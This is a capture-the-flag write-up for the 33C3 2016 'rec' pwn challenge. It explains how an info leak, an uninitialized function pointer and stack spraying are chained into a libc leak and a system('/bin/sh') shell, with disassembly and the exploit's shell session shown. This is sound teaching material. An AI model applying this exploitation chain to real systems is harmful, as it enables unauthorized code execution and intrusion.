## 33C3 CTF 2016 - rec (Pwn 200pt)
##### 27-29/12/2016 (48hr)
___
### Description
rec enables corruption! nc 78.46.224.74 4127
___
### Solution

Rec was a simple calculator:
```	
	Calculators are fun!
	0 - Take note
	1 - Read note
	2 - Polish
	3 - Infix
	4 - Reverse Polish
	5 - Sign
	6 - Exit
	> 
```

PIE is enabled, which makes exploitation more challenging:
```
ispo@nogirl:~/ctf/33c3_16$ /opt/checksec.sh --file rec_7743d76881fe811335ca25d8b0a3c5f54a21e2f1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   rec_7743d76881fe811335ca25d8b0a3c5f54a21e2f1
```

2 bugs were presented. The first one was an information leak on "read note":
```
	> 1
	Your note: �����VUV`����`UV
```

From here we can leak an address from .text which is needed to bypass PIE. The 2nd bug is on Sign
operation:
```assembly
.text:56555D10     call    atoi_56582540
.text:56555D15     add     esp, 10h
.text:56555D18     mov     [ebp+var_1C], eax
.text:56555D1B     cmp     [ebp+var_1C], 0
.text:56555D1F     jle     short loc_56555D2C          ; if positive, jump to positive
.text:56555D21     lea     eax, (positive_56596C85 - 56557FB8h)[ebx]
.text:56555D27     mov     [ebp+funcptr_20], eax
.text:56555D2A     jmp     short loc_56555D3B
.text:56555D2C ; ---------------------------------------------------------------------------
.text:56555D2C
.text:56555D2C loc_56555D2C:                           ; CODE XREF: sign_internal_56596CDB+44j
.text:56555D2C     cmp     [ebp+var_1C], 0
.text:56555D30     jns     short loc_56555D3B          ; if negative, jump to negative
.text:56555D32     lea     eax, (negative_56582CB0 - 56557FB8h)[ebx]
.text:56555D38     mov     [ebp+funcptr_20], eax
.text:56555D3B
.text:56555D3B loc_56555D3B:                           ; CODE XREF: sign_internal_56596CDB+4Fj
.text:56555D3B                                         ; sign_internal_56596CDB+55j
.text:56555D3B     mov     eax, [ebp+funcptr_20]
.text:56555D3E     call    eax                         ; if 0, then segfault
.text:56555D40     nop
.text:56555D41     mov     eax, [ebp+var_C]
.text:56555D44     xor     eax, large gs:14h
.text:56555D4B     jz      short loc_56555D52
.text:56555D4D     call    check_canary_56583030
.text:56555D52
.text:56555D52 loc_56555D52:                           ; CODE XREF: sign_internal_56596CDB+70j
.text:56555D52     mov     ebx, [ebp+var_4]
.text:56555D55     leave
.text:56555D56     retn
.text:56555D56 sign_internal_56596CDB endp
```

As you can see the funcptr_20 is not set when the result from atoi is 0. This means that program
tries to call this function pointer which is uninitialized. The goal here is to somehow control
the dead memory of funcptr and then trigger it. Polish option has a hidden operation 'S', which
adds a bunch of numbers until '.' is entered:
```assembly
.text:56555B36 SUM_LOOP_56555B36:                      ; CODE XREF: polish_56582AA3+E2j
.text:56555B36     sub     esp, 8                      ; move stack upwards
.text:56555B39     push    [ebp+int_1_2C]
.text:56555B3C     push    [ebp+int_1_2C]
.text:56555B3F     mov     eax, [ebp+fptr_24]
.text:56555B42     call    eax                         ; get previous operand
.text:56555B44     add     esp, 8
.text:56555B47     add     [ebp+sum_28], eax
.text:56555B4A     sub     esp, 0Ch
.text:56555B4D     lea     eax, (aOperand - 56557FB8h)[ebx] ; "Operand: "
.text:56555B53     push    eax
.text:56555B54     call    printf_56582500
.text:56555B59     add     esp, 10h
.text:56555B5C     sub     esp, 8
.text:56555B5F     push    0Ch
.text:56555B61     lea     eax, [ebp+operand_18]
.text:56555B64     push    eax
.text:56555B65     call    get_str_565826C0
.text:56555B6A     add     esp, 10h
.text:56555B6D     sub     esp, 0Ch
.text:56555B70     lea     eax, [ebp+operand_18]
.text:56555B73     push    eax
.text:56555B74     call    atoi_56582540
.text:56555B79     add     esp, 10h
.text:56555B7C     mov     [ebp+int_1_2C], eax
.text:56555B7F
.text:56555B7F loc_56555B7F:                           ; CODE XREF: polish_56582AA3+91j
.text:56555B7F     movzx   eax, [ebp+operand_18]
.text:56555B83     cmp     al, 2Eh                     ; operand == '.' ?
.text:56555B85     jnz     short SUM_LOOP_56555B36     ; move stack upwards
```

The problem here is that stack goes upward each time we add a number. This way, if we add many
numbers, we can set the "dead" memory of funcptr from sign operation. So, all we have to do, is
to add some dummy numbers to fill up the gap up to funcptr, and then add 2 more numbers: an 
argument and the function address that we want to call.

We have leaked an address so, our first goal is to leak an address from libc. We make a call to
plt.printf and we set the argument of .got.printf. This way we can get the address of printf in
libc. Then we use the libc-database tool, to find the address of system() and the address of 
/bin/sh. Finally, we make another call (using the Polish/Sign) to system() with argument /bin/sh
and we get a shell. Take a look at the exploit file for more information.

```
ispo@nogirl:~/ctf/33c3_16$ ./rec_expl.py 
[+] .text  address: 0x565d36fb
[+] .libc.printf at: 0xf759d830
[+] .libc.system at: 0xf758e8b0
[+] /bin/sh      at: 0xf76b0bcf
[+] opening shell ...
	id
		uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
	ls
		bin
		boot
		challenge
		dev
		etc
		home
		initrd.img
		initrd.img.old
		lib
		lib32
		lib64
		libx32
		lost+found
		media
		mnt
		opt
		proc
		root
		run
		sbin
		srv
		sys
		tmp
		usr
		var
		vmlinuz
		vmlinuz.old
	ls /home
		challenge
	ls /home/challenge
		flag.txt
		run.sh
	cat /home/challenge/flag.txt
		33c3_DummyFlag
	ls challenge -l    
		total 16
		-rw-r--r-- 1 root root      31 Dec 27 18:53 flag
		-rwxr-xr-x 1 root nogroup 9564 Dec 27 19:18 rec
	cat challenge/flag
		33C3_L0rd_Nikon_would_l3t_u_1n
	exit
	0 - Take note
	1 - Read note
	2 - Polish
	3 - Infix
	4 - Reverse Polish
	5 - Sign
	6 - Exit
	> ^CTraceback (most recent call last):
	  File "./rec_expl.py", line 115, in <module>
	    t.interact()
	  File "/usr/lib/python2.7/telnetlib.py", line 591, in interact
	    rfd, wfd, xfd = select.select([self, sys.stdin], [], [])
	KeyboardInterrupt
```

___